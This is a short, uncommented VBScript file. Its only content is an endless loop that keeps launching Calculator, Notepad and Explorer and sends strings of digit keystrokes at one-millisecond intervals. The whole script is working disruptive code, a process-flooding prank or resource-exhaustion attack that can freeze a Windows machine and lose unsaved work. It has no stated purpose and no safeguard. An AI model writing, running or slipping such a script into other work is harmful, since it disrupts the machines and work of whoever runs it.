Set WshShell = CreateObject("WScript.Shell")
Do While 1 < 5
WshShell.Run "calc.exe"
WshShell.Run "notepad.exe"
WshShell.Run "explorer.exe"
WshShell.SendKeys "8"
WScript.Sleep(1)
WshShell.SendKeys "4"
WScript.Sleep(1)
WshShell.SendKeys "3"
WScript.Sleep(1)
WshShell.SendKeys "9"
WScript.Sleep(1)
WshShell.SendKeys "6"
WScript.Sleep(1)
WshShell.SendKeys "4"
WScript.Sleep(1)
WshShell.SendKeys "7"
WScript.Sleep(1)
WshShell.SendKeys "2"
WScript.Sleep(1)
WshShell.SendKeys "1"
WScript.Sleep(1)
WshShell.SendKeys "6"
WScript.Sleep(1)
WshShell.SendKeys "3"
WScript.Sleep(1)
WshShell.SendKeys "8"
Loop
